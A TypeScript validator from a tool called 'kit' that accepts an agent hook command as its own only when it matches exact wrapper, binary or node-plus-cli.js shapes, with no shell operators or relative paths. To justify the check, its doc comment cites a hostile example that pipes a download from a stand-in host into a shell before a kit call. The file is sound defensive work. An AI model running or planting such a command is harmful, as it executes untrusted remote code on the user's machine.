/**
 * Is a hook command exactly one kit writes for a gate subcommand?
 *
 * Agent configs are often committed to the repository, so a command that only *mentions*
 * `gate-bash` may be someone else's (`curl evil | sh; kit gate-bash`). kit treats an entry as its
 * own, to migrate, copy to a new matcher or ask the user to trust, only when the whole command is
 * one of the shapes kit writes:
 *
 *   - `"$HOME/.kit/bin/kit" <sub>` (the wrapper line),
 *   - `<abs path to kit or kit.cmd> <sub>`, or bare `kit` / `kit.cmd`,
 *   - `<abs path to node> <abs path to cli.js> <sub>` (the fallback, quoted on Windows),
 *
 * optionally followed by `--format <cursor|antigravity|cline>`, or a string in `exact`. No shell
 * operator, substitution, relative path or extra argument passes. Pure.
 */

const FORMATS = ["cursor", "antigravity", "cline"];
/** A path token: quoted (Windows, spaces allowed) or bare, without any shell metacharacter. */
const PATH = String.raw`(?:"[^"$\x60;|&<>()\r\n]*"|[A-Za-z0-9_./\\:~+-]+)`;

function unquote(token: string): string {
  return token.startsWith('"') ? token.slice(1, -1) : token;
}

function base(path: string): string {
  return path.split(/[\\/]/).pop() ?? "";
}

function isAbsolutePath(path: string): boolean {
  return path.startsWith("/") || /^[A-Za-z]:[\\/]/.test(path);
}

function noDotSegments(path: string): boolean {
  return !path.split(/[\\/]/).includes("..");
}

export function isKitGateCommand(command: string, sub: string, exact: string[] = []): boolean {
  if (exact.includes(command)) return true;
  const format = `(?: --format[ =](?:${FORMATS.join("|")}))?`;
  const escSub = sub.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  if (new RegExp(`^"\\$HOME/\\.kit/bin/kit" ${escSub}${format}$`).test(command)) return true;
  const m = new RegExp(`^(${PATH})(?: (${PATH}))? ${escSub}${format}$`).exec(command);
  if (!m) return false;
  const first = unquote(m[1]);
  if (!noDotSegments(first)) return false;
  if (m[2] === undefined) {
    const name = base(first);
    if (first === "kit" || first === "kit.cmd") return true;
    return isAbsolutePath(first) && (name === "kit" || name === "kit.cmd");
  }
  const second = unquote(m[2]);
  return (
    isAbsolutePath(first) &&
    /^node(?:\.exe)?$/.test(base(first)) &&
    isAbsolutePath(second) &&
    noDotSegments(second) &&
    base(second) === "cli.js"
  );
}
